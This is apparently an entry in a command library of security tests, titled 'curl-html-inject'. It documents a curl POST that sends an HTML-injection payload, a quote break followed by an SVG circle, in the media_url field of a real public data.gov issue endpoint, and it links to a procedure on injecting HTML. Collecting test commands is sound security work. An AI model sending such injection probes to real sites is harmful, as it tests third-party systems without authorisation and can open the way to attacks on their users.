---
id: cmd-uuid-2
data: >-
  curl -X POST 'https://www.data.gov/issue/' -d
  'media_url=catalog.data.gov/dataset/consumer-complaint-database\"%3E%3Csvg
  height=\"100\" width=\"100\"> <circle cx=\"50\" cy=\"50\" r=\"40\"
  stroke=\"black\" stroke-width=\"3\" fill=\"red\" /> </svg>'
tags:
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.804Z'
verified: false
validated: true
submitted: true
---
# curl-html-inject

## Command

```bash
curl -X POST 'https://www.data.gov/issue/' -d 'media_url=catalog.data.gov/dataset/consumer-complaint-database\"%3E%3Csvg height=\"100\" width=\"100\"> <circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"3\" fill=\"red\" /> </svg>'
```

## Description

Sends a POST request with an HTML injection payload to test SVG rendering in the media_url parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-d` | Data payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target/issue/' -d 'media_url=payload'
```

### Advanced Usage

Add verbose: ```bash
curl -v -X POST ... 
```

## Expected Output

HTTP response with reflected payload showing SVG code; render in browser to see red circle.

## Related

- [[procedures/Inject-HTML-via-media_url-on-issue-Endpoint]]
